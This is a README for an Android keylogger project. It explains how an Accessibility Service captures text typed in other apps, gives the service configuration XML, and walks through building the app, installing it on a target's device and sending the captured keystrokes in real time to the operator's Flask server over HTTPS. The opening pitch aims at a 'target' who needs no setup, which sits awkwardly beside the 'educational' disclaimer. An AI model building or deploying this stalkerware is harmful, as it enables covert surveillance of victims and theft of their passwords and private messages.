# Key-Logger-android
this is an android key logger that captures keystrokes and remains active in the background without needing to be interacted with after opened this will require one permission  no technical setup on the targets end

# Android Keylogger via Accessibility Service

This project is a keylogger implementation for Android that uses the Accessibility Service API to monitor and log text input events across applications. It is intended for **educational**, **development**, or **authorized internal testing** purposes only.

## Overview

The keylogger works by running a custom `AccessibilityService` that listens for `TYPE_VIEW_TEXT_CHANGED` and `TYPE_VIEW_FOCUSED` events. These are triggered when a user types in a text field or when a view gains focus. The service can retrieve and log the content of these events, making it possible to capture user input at the system level.

Unlike older methods that relied on input APIs or root access, this approach works without rooting the device and is compatible with modern Android versions, including Android 14 (API 35), when configured correctly.

---

## How It Works

- The app defines a foreground service (`KeyLoggerService`) that extends `AccessibilityService`.
- Upon activation, the service monitors system-wide accessibility events related to text changes.
- Relevant data from these events is extracted, filtered, and optionally logged (to Logcat, local storage, or sent elsewhere).
- This approach does not capture physical keyboard presses directly, but intercepts text after it is rendered into views.

---

## Key Components

### 1. Accessibility Service Configuration

Located at: `res/xml/accessibility_service_config.xml`

```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:settingsActivity="com.example.myapplication.MainActivity" />
```
To use the code first 
1: in com\example\yourapp\   You would copy or create the 2 main files KeyloggerService.kt and MainActivity.kt

2: Paste the code in there designated files.

3: Replace your AndroidManifest.xml with the provided one

4: In res\ create another folder called layout and in the layout folder create activity_main.xml and enter the text editor and paste the provided code

5: In build.gradle.kts replace it the provided code

6: After that run your python server and replace the URL in the kyloggerService.kt with the one of your flask app i recommend using a service to expose your app to get a HTTPS URL as current android versions block HTTP requests

7: Than once you replace the URL incase you encounter an error make sure your >package com.example.myapplication< is replaced with your actual package name including in the AndroidManifest.xml, Than after that save and hit ctrl+F9 to build

Once you build the app it install it on an android device and allow accessibility services on the app and it should start showing a notification that the service is running.
Once it starts check your flask logs to read for 200 when it does and you begin seeing logs test the app by typing outside the app it should than creat a txt file on your pc and recording the keystokes from the android device in real time.
